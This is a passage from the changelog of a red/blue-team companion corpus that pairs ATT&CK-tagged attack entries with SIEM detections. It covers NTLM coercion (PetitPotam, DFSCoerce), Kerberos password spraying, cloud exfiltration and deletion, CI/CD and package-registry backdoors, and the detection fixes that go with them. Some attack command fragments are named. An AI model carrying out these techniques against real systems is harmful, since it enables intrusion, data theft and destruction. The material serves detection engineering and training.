  no `petitpotam` either. Its third was `dfscoerce …`, which is `Wh04m1001/DFSCoerce`, a
  git clone rather than a binary on anyone's PATH. Both are now `coercer` invocations,
  since coercer implements the same two vectors as MS-EFSR and MS-DFSNM: filtered with
  `--filter-method-name Efs` (the whole method family, rather than the single
  `EfsRpcOpenFileRaw` that is patched on a current DC) and `--filter-protocol-name
  MS-DFSNM` respectively. The body carries that reasoning. The middle line, `printerbug`,
  was always correct and is untouched.

  Worth knowing *where* this hid: `dotfiles-Offense` lists `coerce-petitpotam` among the
  seven entries it deliberately does **not** project into `hacktheplanet` (the prose there
  is the richer superset), so the `companion.yml` byte-gate never compared the two and
  never would have. But `~/companion` is symlinked and `htpx` is a first-class alias, so
  an operator picks the entry, hits `clip`, and gets `command not found` mid-coercion.
  The `impacket-petitpotam` line was reported by dotfiles-Offense's `/doc-audit` routine
  (dotgibson/dotfiles-Offense#186); the `dfscoerce` line was found while fixing it, and is
  newer than that report — it arrived in #68, after v2.7.0 was vendored.

- **`password-spray-4625` could not fire on its own paired attack** (#65). The
  red entry's only command is `kerbrute passwordspray`, which sprays **Kerberos
  AS-REQ pre-authentication** — a wrong password there lands on the DC as `4771`
  `Failure_Code=0x18`. The detection keyed exclusively on `4625`, the
  NTLM/interactive/SMB logon-failure event, which that command never generates.
  The `4771` fan-out is now the primary query and `4625` the secondary, scoped
  to the NTLM/SMB spray path where it *is* the right event. The
  one-source-to-many-distinct-accounts framing was already correct and is
  unchanged — only the telemetry it keys on was wrong.
- **`npm-publish-audit` filtered out the class its own paired attack publishes
  as** (#67). The red entry's headline command publishes with a *stolen
  automation token*, which is recorded as an automation/CI actor — and the
  detection's `NOT actor.type=ci` excluded exactly that class, so the technique's
  primary path could never fire. The entry's prose already described the right
  design ("pin releases to the CI publish identity, allowlist it"), but the query
  implemented a blanket class-exclusion, which is its opposite: a compromised
  automation token is indistinguishable from the legitimate one *by class*. Now
  allowlists the specific publisher identity (`actor.name`, or `actor.token_id`
  where exposed) and keeps actor class as an enrichment column rather than a
  gate.
- **`coercion-5145` missed DFSCoerce and MS-EFSR's `samr` endpoint** (#67). The
  pipe set gains **`netdfs`** (MS-DFSNM / DFSCoerce, DC-only) and **`samr`**;
  the red pair gains a `dfscoerce` command so the corpus demonstrates the vector
  the detection now covers. `Access_Mask="0x3"` also moves out of the filter and
  into the reported fields — as a gate it silently drops any client that opens
  the pipe with a different mask, which contradicts the entry's own premise that
  the endpoint is the invariant and the tool is not.

  **`lsass` was reported as a bogus pipe and has been kept** — the review's
  claim that it is "a process, not a coercion named pipe" is incorrect, and
  acting on it would have opened a hole rather than closed one. MS-EFSR is
  exposed over five SMB named pipes — `efsrpc`, `lsarpc`, `samr`, `lsass`,
  `netlogon` — and `\pipe\lsass` is a genuine RPC endpoint that PetitPotam and
  `coercer` both spray. The entry now names all three protocols and their pipes
  inline, so the membership of the set is justified where it is used.
- **`cloud-destroy-cloudtrail` was default-blind to the destructive half of its
  paired attack** (#67). `DeleteObject`/`DeleteObjects` are S3 **data events**,
  absent from CloudTrail unless per-bucket data-event logging is enabled — so on
  a default account the query caught the deny-recovery calls (all management
  events) and silently missed the `aws s3 rm --recursive` burst that is the red
  entry's payload. Documented with the same caveat and fallback (S3 server
  access logs / CloudWatch) that sibling entry `aws-s3-exfil-cloudtrail` already
  carried for `GetObject`, resolving an internal inconsistency. A second query
  also surfaces singleton `DeleteBucket`/`DeleteTable`/snapshot deletes, which
  the `count>10` burst floor could never reach despite each being a finding on
  its own.

### Documentation

- **README states an ATT&CK baseline.** The corpus tracks live ATT&CK rather
  than a pinned bundle; it now says so, names the current baseline (v19, April
  2026) and the Stealth / Defense Impairment split, and points at the weekly
  review as the mechanism that keeps it current. Without this, a retag cycle
  like the one above reads as unexplained drift.
- **Corrected the stale corpus count** in the same section: "70-plus paired
  attack/detection concepts (plus a recon entry)" → 90 pairs plus two unpaired
  recon entries.
- **Four detections now document where they fail** (#67), a polish pass on
  entries whose prose promised more precision than their query delivered:
  - `consent-grant-auditlogs` said the invariant was a *user* (not admin)
    consent, but admin consent raises the **same** `Consent to application`
    operation and the KQL never separated them. Now reads
    `ConsentContext.IsAdminConsent` out of the modified properties and says to
    run it both ways — a tenant-wide admin grant on those scopes is rarer and
    worse than the user grant, and was previously buried rather than surfaced.
  - `aws-iam-privesc-cloudtrail` notes that its self-grant branch compares
    `actor` (an ARN/`principalId`) to `target` (a bare `userName`), so the
    literal equality rarely holds, and that a customer-managed `"Action": "*"`
    policy escalates identically while matching neither ARN test.
  - `potato-seimpersonate-4688` notes that PrintSpoofer/GodPotato impersonate
    SYSTEM *before* spawning the shell, so the 4688 Subject may log as `SYSTEM`
    and be excluded by the service-account list meant to catch it — keeping the
    failed escalations and dropping the successful ones. Adds a
    `Creator_Process_Name` variant as the sturdier 4688 key.
  - `cf-waf-disable` (red) targeted the **legacy Firewall Rules API**, sunset
    2025-06-15 and unreproducible on a current tenant; refreshed to the
    Rulesets-engine equivalent under the `http_request_firewall_custom` phase,
    using a `enabled:false` PATCH as the quieter variant. The blue half needed
    no query change — it already matched `ruleset` alongside `firewall_rule` —
    but now explains why both values are retained.

## [v2.7.0] - 2026-08-01

### Added

- **Cloud-IdP escalation parity — 2 new red↔blue pairs** closing the two gaps that
  were the most visible _relative to what the corpus already claimed to cover_
  (#62): each is the direct analogue of a pair that already existed for the
  neighbouring platform.
  - **Entra privileged directory-role grant (`T1098.003`)** —
    `entra-directory-role` ↔ `entra-role-assign-audit`. Google Workspace
    super-admin was covered end-to-end while its Entra twin was not; Entra was
    well covered on the **app** plane (`consent-grant`, `device-code`,
    `sp-cred-backdoor`) but had nothing on the **directory-role** plane. Red
    covers the Graph role-assignment call and flags **Privileged Authentication
    Administrator** as the quiet choice (it can reset a Global Admin's
    credentials). Blue keys on the `Add member to role` audit operation, reading
    the role from the `Role.DisplayName` modified property rather than the
    top-level event, and covers the PIM `Add eligible member to role` variant —
    without which a standing backdoor is invisible until it is activated.
  - **AWS IAM privilege escalation (`T1098.003`)** — `aws-iam-privesc-policy` ↔
    `aws-iam-privesc-cloudtrail`. GCP had `gcp-iam-policy-backdoor`; AWS covered
    console / access-key / S3 / destroy but not the escalation itself. Red covers
    both shapes — the `AttachUserPolicy` self-grant and the `iam:PassRole` path
    that never touches the actor's own identity. Blue carries a query for each,
    since one cannot cover both: the self-grant query also catches
    `CreatePolicyVersion --set-as-default` (the same escalation wearing an
    update's clothes) and `PowerUserAccess` alongside `AdministratorAccess`,
    while the PassRole query keys on the launching call's `requestParameters` —
    **there is no `PassRole` CloudTrail event**, it being an authorization check
    rather than an API call, which is why that half is so often missed.

### Changed

- **Cryptomining pair retagged `T1496` → `T1496.001` (Compute Hijacking)**
  (`resource-hijack-xmrig`, `cryptomine-pool-detect`). ATT&CK gained
  sub-techniques under T1496 Resource Hijacking, and MITRE places cryptocurrency
  mining under `.001` Compute Hijacking (XMRig-using actors are listed on that
  page). The parent tag is not deprecated, so this is a sharpening rather than a
  correction — both halves of the pair move together to stay in sync.
- **`web-service-c2-beacon` gained a host-role tuning caveat.** The entry's prose
  promises process-context discipline, but the deployable SPL excludes only a
  hardcoded Windows _desktop_ image list. On servers and CI/build agents,
  `python.exe`/`node.exe`/`curl.exe` and agents under `\ProgramData\` clear the
  `conns>3 AND active_hours>2` floor doing ordinary work — and the query's own
  `user_writable` heuristic (whose regex matches `\ProgramData\` as a proxy for
  drop-site paths, not as an ACL claim) then ranks that legitimate tooling like a
  dropper. Documented the split-by-role tuning the query needs.

## [v2.6.0] - 2026-07-24

### Fixed

- **`printerbug.py` → `printerbug` in two red entries** (`coerce-petitpotam`,
  `unconstrained-deleg-tgt`). Kali ships the tool via the apt `krbrelayx`
  package, which installs it as `printerbug` (no `.py`) — the git-clone-era
  `.py` invocation no longer resolves. This is the source-of-truth fix for the
  stale name that renders into `dotfiles-Kali`'s `hacktheplanet` generated
  block on the next companion sync.

## [v2.5.0] - 2026-07-23

### Added

- **Cloud Collection parity — 1 new red↔blue pair (`T1530` Data from Cloud
  Storage).** Fills the corpus's thinnest tactic: `aws-s3-mass-exfil` (bulk
  `ListBucket` → `GetObject`/`sync`, or server-side `CopyObject` into an attacker
  bucket) ↔ `aws-s3-exfil-cloudtrail` (per-principal object-read volume via
  CloudTrail S3 data events, with a caveat that data events must be enabled and an
  S3-server-access-log / `BytesDownloaded` fallback). S3 is the canonical
  cloud-exfil target and was previously uncovered.

### Changed

- **`web-service-c2-beacon` inverted to a process-centric gate.** The detection now
  triggers on non-browser / user-writable-path processes making periodic 443 SaaS
  beacons rare-for-the-host, instead of a hardcoded 4-domain allowlist that any
  other trusted-SaaS C2 (Discord, Dropbox, Pastebin, …) evaded silently. The four
  domains are demoted to a labelled seed IOC list, matching the red entry's "the
  tell is the _process_."
- **`adcs-esc1-4886` retargeted to 4887 with a SAN-logging caveat.** Primary now
  keys on `4887` (certificate _issued_) plus CA request-attribute auditing; adds a
  caveat that the `4886` `upn=` parse is best-effort and can silently miss without CA
  auditing, and separates the `5136 userCertificate` line as shadow-cred/relay
  telemetry rather than an ESC1-SAN backstop.
- **`mass-encrypt-4663` now ships the Sysmon-11 FileCreate variant as primary.**
  File-data SACLs are off by default, so the 4663-only query was blind
  out-of-the-box; the Sysmon-11 branch the prose already advertised is now
  implemented and preferred (no SACL required).
- **`mtls-c2-ja3` refreshed toward JA4/JA4S.** Notes that JA3 is increasingly
  defeated by TLS randomization (uTLS) and to prefer JA4/JA4S (FoxIO, 2023+, emitted
  by current Zeek) where available.

## [v2.4.0] - 2026-07-16

### Added

- **GCP parity — 2 new red↔blue pairs (+4 entries) and a recon entry (+1).** Brings
  GCP up from a single pair to rough parity with the other big-three clouds.
  **Persistence** (`T1098`): IAM policy backdoor — `setIamPolicy` binding a rogue
  principal — detected on the `SetIamPolicy` `ADD` binding delta in Cloud Audit
  Logs. **Defense Evasion** (`T1562.008`): Cloud Audit log tamper — `DeleteSink` /
  `auditConfigs` strip — detected via the self-witnessing Admin Activity events
  (plus a Data Access gap monitor). Also adds an unpaired **Discovery**
  (`T1580`/`T1526`/`T1069.003`) `gcp-enum-recon` entry (projects / Asset Inventory /
  IAM blast-radius mapping), mirroring the unpaired on-prem `smb-enum-nxc`.

### Changed

- **`asrep-probing-4771` retargeted to the real AS-REP roast artifact.** The
  detection now keys primarily on a _successful_ `4768` with pre-authentication
  type 0 (the AS-REP etype is negotiated — often RC4 `0x17`, AES where RC4 is
  disabled — so the clause keys on the type-0 invariant, not the cipher) — the
  roastable AS-REP its red mate actually emits — and keeps
  the `4771 0x18` one-source-many-accounts burst as a secondary Kerbrute
  enumeration/spray tell. Previously it only saw the collateral `4771` probing, not
  the roast itself.

## [v2.3.0] - 2026-07-10

### Added

- **Command & Control + Impact corpus (14 new red↔blue pairs, +28 entries).** Fills
  the two tactics that had **zero** coverage. **`TA0011` Command & Control** (8 pairs):
  HTTPS beacon sleep+jitter, DNS tunneling, domain fronting, mutual-TLS/JA3, ICMP
  tunneling, web-service C2 (Telegram/Slack/Gist), DGA rendezvous, and reverse
  tunnels (chisel/ligolo) — each attack paired with the network/host detection that
  survives its evasion (inter-arrival regularity, Sysmon-22 query shape, SNI/Host
  mismatch, JA3 fingerprints, NXDOMAIN entropy). **`TA0040` Impact** (6 pairs):
  recovery inhibition (`vssadmin`/`wbadmin`/`bcdedit`), mass file encryption, pre-
  encryption service kills, cloud data destruction (CloudTrail delete burst),
  cryptojacking (Stratum), and account access removal (4724/4725/4726). Corpus-only
  (no flat-view markers); every new entry carries a valid, non-deprecated ATT&CK
  technique ID.

## [v2.2.0] - 2026-07-09

### Added

- **`/corpus-review` maintenance routine** (`.claude/commands/corpus-review.md` +
  `.github/workflows/claude-routines.yml`). A weekly, report-first Claude routine that
  reviews the judgment layer `ci.yml` can't gate: ATT&CK-ID validity (against live
  MITRE), red↔blue **semantic** pairing fidelity, coverage holes, and detection
  quality. Files a deduplicated issue and changes nothing. **Inert by default** —
  scaffolded but dormant until a `CLAUDE_CODE_OAUTH_TOKEN` repo secret is added. Runs
  Thu 08:00 UTC, off the rest of the fleet's routine crons.
- **`/release-readiness` + `/release-notes` routines** (`.claude/commands/` + two new
  dispatch-only jobs in `claude-routines.yml`). The htpx twin of Core's release
  routines: `release-readiness` reads the Conventional Commits + CHANGELOG since the
  last tag and files a **go/no-go verdict with the recommended next SemVer**;
  `release-notes` drafts the CHANGELOG entry from those commits. Both report-first and
  dispatch-only — run them at release time via **Actions → claude-routines → Run
  workflow → routine**. Same inert-by-default token gate.

### Fixed

- **ATT&CK tactic corrections surfaced by the first `/corpus-review` run** (T1195.002,
  T1047), both verified against live MITRE:
  - `T1195.002` (Compromise Software Supply Chain) is an **Initial Access** technique,
    not Execution — retagged `TA0002` → `TA0001` (+ phase) in the npm/pypi
    malicious-publish pair (4 entries).
  - `T1047` (WMI) is filed by MITRE only under **Execution**, not Lateral Movement —
    retagged `TA0008` → `TA0002` (+ phase) in the wmiexec pair (2 entries).
    Red↔blue tags stay in agreement; pairings unchanged, so `ci.yml`'s pairing/slot/drift
    gates are unaffected.

### Internal

- Hardened the report-first routines' "change nothing" guarantee into a mechanical one
  (read-only `--permission-mode default`; read-only Bash allowlists; tightened git
  allowlist) and fixed a `sync-fanout` tag-resolve race that could throw a spurious red
  X on CHANGELOG-only merges. Renovate action-pin bumps.

## [v2.1.0] - 2026-07-08

### Added

- `renovate.json` - configuration for Renovate app.

## [v2.0.0] - 2026-07-06

### Changed

- **README second-pass polish.** The `dotgibson` shield now tracks the
  `dotfiles-core` release version; dropped the showcase and LinkedIn shields for a
  one-line header (LinkedIn moved to Contact); the docs links now point at the
  documentation hub root (`/docs`); and About gained `Languages` (Markdown) +
  `Tools` (MITRE ATT&CK, fzf) subsections.
- **README rebuilt as a lean showcase landing page.** Brought the README up to the
  `dotgibson` exemplar bar — a reference-style shields header, the org logo, a
  collapsible TOC, then a lean body (what htpx is and how it's vendored into
  `dotfiles-Kali`, Getting Started, a representative corpus slice, and the
  entry-first contribution workflow). The full 70+-row corpus table is trimmed to
  a representative sample that points at `entries/` and the on-site red↔blue view.
  Added a `.markdownlint.jsonc` (mirrored from Core) scoping the showcase HTML via
  MD033 `allowed_elements`.

### Added

- **Slack** platform (3 companion-only red↔blue pairs) — the SaaS-collaboration seam, detected
  over the Slack (Enterprise Grid) audit logs (`product: slack`, field `action`):
  - `slack-malicious-app` ↔ `slack-app-audit` — install a broad-scope OAuth app for durable
    message/file access; detect `app_installed` (T1098).
  - `slack-external-share` ↔ `slack-external-share-audit` — invite an attacker-controlled
    workspace into a channel via Slack Connect to exfil its history; detect
    `shared_channel_invite_sent` / `_accepted` (T1567).
  - `slack-2fa-disable` ↔ `slack-2fa-audit` — turn off enforced 2FA to weaken workspace auth;
    detect `pref.two_factor_auth_changed` with 2FA off (T1562.001).

- **PyPI registry** platform (3 companion-only red↔blue pairs) — the Python mirror of the npm
  round, detected over the PyPI project journal (`product: pypi`, field `action`):
  - `pypi-malicious-publish` ↔ `pypi-publish-audit` — upload a trojanized release via a stolen
    API token (bypassing trusted publishing); detect `new release` not via a trusted publisher
    (T1195.002).
  - `pypi-role-add` ↔ `pypi-role-audit` — add a rogue Owner/Maintainer for durable publish
    rights; detect journal `add Owner` / `add Maintainer` (T1098).
  - `pypi-trusted-publisher` ↔ `pypi-trusted-publisher-audit` — register an attacker-controlled
    OIDC trusted publisher for a credential-less publish backdoor; detect an add-`trusted
publisher` journal entry (T1098).

- **npm registry** platform (3 companion-only red↔blue pairs) — the software supply-chain
  seam, detected over the npm account/org audit log (`product: npm`, field `action`):
  - `npm-malicious-publish` ↔ `npm-publish-audit` — publish a trojanized package version via
    a compromised maintainer token; detect `package.publish` by an off-CI actor (T1195.002).
  - `npm-owner-add` ↔ `npm-owner-audit` — add a rogue maintainer for durable publish rights;
    detect `package.owner_add` / `team.user_add` (T1098).
  - `npm-2fa-disable` ↔ `npm-2fa-audit` — disable require-2FA-to-publish (`npm access set
mfa=none`) so a stolen token ships quietly; detect `package.edit` `mfa=none` (T1562.001).

- **Cloudflare edge** platform (3 companion-only red↔blue pairs) — detections over the
  Cloudflare account audit log (`product: cloudflare`, fields `action.type`/`resource.type`):
  - `cf-api-token` ↔ `cf-api-token-audit` — mint a long-lived API token for durable
    control-plane access after account compromise; detect `resource.type=api_token`
    `action.type=create` (T1098).
  - `cf-waf-disable` ↔ `cf-waf-disable-audit` — delete/disable a WAF or firewall rule to
    expose the origin; detect `firewall_rule`/`ruleset` `delete`/`update` (T1562.001).
  - `cf-worker-deploy` ↔ `cf-worker-deploy-audit` — deploy a malicious Worker to skim/proxy
    live edge traffic; detect `resource.type=worker` `create`/`update` (T1648).

- **Google Workspace** platform (3 companion-only red↔blue pairs) — detections over the
  Google Workspace admin/token/user audit logs (`product: google_workspace`, field
  `eventName`):
  - `gws-oauth-grant` ↔ `gws-oauth-audit` — consent-phish a malicious OAuth app into
    Gmail/Drive scopes; detect token `authorize` (T1528).
  - `gws-super-admin` ↔ `gws-admin-audit` — promote a controlled user to super admin;
    detect `GRANT_DELEGATED_ADMIN_PRIVILEGES` / `ASSIGN_ROLE` (T1098.003).
  - `gws-mail-forward` ↔ `gws-mail-forward-audit` — external auto-forwarding for BEC
    exfil; detect `email_forwarding_out_of_domain` (T1114.003).

- **Snowflake data cloud** platform (3 companion-only red↔blue pairs) — mirrors the
  2024 Snowflake credential-attack TTPs, detected via `ACCOUNT_USAGE.QUERY_HISTORY`
  (`product: snowflake`, `query_type`/`query_text`):
  - `snowflake-exfil-stage` ↔ `snowflake-exfil-audit` — `COPY INTO` external stage bulk
    unload; detect `QUERY_TYPE=UNLOAD` (T1567.002).
  - `snowflake-rogue-user` ↔ `snowflake-user-audit` — backdoor user + ACCOUNTADMIN grant;
    detect `CREATE_USER` / privileged `GRANT` (T1136.003).
  - `snowflake-network-policy` ↔ `snowflake-network-policy-audit` — open/drop the IP
    allowlist so stolen creds work anywhere; detect `NETWORK POLICY` changes (T1562.007).

- **Jenkins CI/CD** platform (3 companion-only red↔blue pairs) — the self-hosted
  counterpart to the GitHub/GitLab SaaS rounds, detected via the Jenkins Audit Trail
  plugin log (`product: jenkins`, keyword/URI matches):
  - `jenkins-script-console` ↔ `jenkins-script-console-audit` — Groovy Script Console
    RCE + in-memory credential dump; detect `/script` / `/scriptText` (T1059).
  - `jenkins-api-token` ↔ `jenkins-api-token-audit` — mint a user API token for durable
    non-interactive access; detect `generateNewToken` (T1098).
  - `jenkins-job-backdoor` ↔ `jenkins-job-backdoor-audit` — create/reconfigure a job to
    run attacker code on the controller + agents; detect `/createItem` / `/job/<name>/configSubmit`
    (T1072).

- **Terraform Cloud / IaC** platform (3 companion-only red↔blue pairs) — detections
  are Terraform Cloud audit-trail SPL (`product: terraform`, nested `resource.type` /
  `resource.action`):
  - `tfc-agent-hijack` ↔ `tfc-agent-audit` — rogue agent pool routes plans/applies to
    attacker infra (captures cloud creds + state); detect `agent_pool` `create` (T1543).
  - `tfc-token-backdoor` ↔ `tfc-token-audit` — mint an org/team API token for durable
    API + state access; detect `authentication_token` `create` (T1098).
  - `tfc-var-injection` ↔ `tfc-var-audit` — inject a workspace env variable to run code
    / exfil at apply; detect `variable` `create`/`update` (T1072).

- **HashiCorp Vault** platform (3 companion-only red↔blue pairs), opening the
  secrets-management seam — detections are Vault audit-device SPL (`product: vault`
  on the Sigma side):
  - `vault-secret-exfil` ↔ `vault-secret-read-audit` — bulk-read KV secrets to drain
    the credential store; detect `read` breadth over `secret/` paths (T1555).
  - `vault-approle-backdoor` ↔ `vault-approle-audit` — create a rogue AppRole for
    durable machine auth; detect create/update on `auth/approle/role/` (T1098).
  - `vault-audit-disable` ↔ `vault-audit-device-audit` — disable a Vault audit device
    to blind the SIEM; detect `delete` on a `sys/audit/` path (T1562.001).

- **GitLab CI/CD** platform (3 companion-only red↔blue pairs), mirroring the GitHub
  Actions round on GitLab audit-event telemetry (`product: gitlab`, field
  `event_type`):
  - `gl-runner-hijack` ↔ `gl-runner-audit` — attach an attacker-controlled runner to
    the project to capture CI jobs + masked variables; detect
    `set_runner_associated_projects` (T1543).
  - `gl-protected-branch-off` ↔ `gl-protected-branch-audit` — remove protected-branch
    rules to land unreviewed code; detect `protected_branch_removed` /
    `protected_branch_created` (T1562.001).
  - `gl-token-backdoor` ↔ `gl-token-audit` — mint a project access / deploy token for
    durable access; detect `project_access_token_created` /
    `personal_access_token_created` / `deploy_token_created` (T1098).
- **Harbor container registry** platform (3 companion-only red↔blue pairs), opening
  the container-image / registry supply-chain seam — detections are Harbor
  registry audit-log SPL (`product: harbor` on the Sigma side):
  - `harbor-image-backdoor` ↔ `harbor-image-push-audit` — push a trojanized image
    over a trusted tag to poison downstream pulls; detect `operation=push`
    artifact (T1525, Implant Internal Image).
  - `harbor-robot-backdoor` ↔ `harbor-robot-audit` — mint a long-lived robot
    account for durable registry access; detect `operation=create`
    `resource_type=robot` (T1098).
  - `harbor-artifact-delete` ↔ `harbor-artifact-delete-audit` — delete the trusted
    artifact to force a poisoned re-pull + erase evidence; detect `operation=delete`
    artifact/repository (T1070).
- **GitHub Actions CI/CD** platform (3 companion-only red↔blue pairs), opening a
  new logsource the way the Okta round did — detections are GitHub Enterprise
  audit-log SPL (`product: github` on the Sigma side):
  - `gh-self-hosted-runner` ↔ `gh-runner-audit` — rogue self-hosted runner
    harvests job source + secrets; detect `self_hosted_runner.created` (T1543).
  - `gh-branch-protection-off` ↔ `gh-branch-protection-audit` — disable/override
    branch protection to land unreviewed code; detect `protected_branch.destroy` /
    `protected_branch.policy_override` (T1562.001).
  - `gh-deploy-key-backdoor` ↔ `gh-cred-audit` — writable deploy key / fine-grained
    PAT for durable access; detect `repo.create_deploy_key` /
    `personal_access_token.access_granted` (T1098).
- Corpus is now 71 paired concepts + 1 unpaired recon entry.

## [v1.4.0] - 2026-06-30

### Fixed

- `sync-fanout.yml` Sync step: call Kali's `sync-companion.sh` with NO argument.
  It was passed `main` as a positional, but that arg is the REMOTE (URL), not a
  branch so it tried to pull from a remote named `main` (`fatal: 'main' does
not appear to be a git repository`). The script derives both the htpx remote
  and the branch (`main`) from `companion.lock` itself.
- `sync-fanout.yml` auth: the Sync step now injects all git auth + the bot identity
  via step-scoped `GIT_CONFIG_COUNT`/`KEY`/`VALUE` instead of `git config --global`
  (no token written to `~/.gitconfig`; consistent with the Resolve step).
  htpx is read with the built-in `GITHUB_TOKEN` via a more-specific,
  `.git`-anchored `url.insteadOf` (longest match wins, and the anchor avoids
  rewriting same-prefix repos like `<owner>/htpx-tools`), so the
  `git subtree pull` works without `FLEET_SYNC_TOKEN` ever needing htpx access;
  `FLEET_SYNC_TOKEN` stays scoped to the dotfiles-Kali clone/push/PR.

## [v1.3.0] - 2026-06-30

### Fixed

- `sync-fanout.yml` Resolve step: the htpx clone / `ls-remote` reads are now
  authenticated with the built-in `GITHUB_TOKEN` (`contents: read`). They were
  unauthenticated, so on a private htpx the fan-out died at the first clone with
  `could not read Username for 'https://github.com'`. Auth is injected via
  `GIT_CONFIG_COUNT`/`KEY`/`VALUE` env (an `url.insteadOf` rewrite scoped to that
  step), so the token is never written to `~/.gitconfig` and can't shadow the next
  step's `actions/checkout`; `FLEET_SYNC_TOKEN` stays reserved for the cross-repo
  writes to dotfiles-Kali.
- Release + fan-out workflows hardened (PR review): `auto-tag.sh` now fails loud
  when `--release` is requested but `gh` is absent; `auto-tag.yml` cuts
  tags/releases only from the default branch; `sync-fanout.yml` resolves and
  verifies the tag exists before checkout (a bad dispatch input is a clean no-op),
  aborts the sync if `gen-views.sh` fails (no PR), and fails on ANY `core.lock`
  diff versus the base branch — not just the `core_sha` field.

## [v1.2.0] - 2026-06-30

### Added

- Release automation: `auto-tag.yml` tags + releases on a new top CHANGELOG
  version, and `sync-fanout.yml` fans the released ref out to `dotfiles-Kali`
  as a `companion.lock`-bump PR this CHANGELOG seeds that pipeline at the
  current tag.

## [v1.1.0]

### Added

- Polished README landing-page hero.

## [v1.0.0]

### Added

- Initial standalone extraction of the structured red↔blue paired companion from
  `dotfiles-Kali`: `htpx` fzf browser, `gen-views.sh` source-of-truth bridge with
  `--check` drift gate, and the ATT&CK-tagged `entries/red|blue/*.md` corpus.
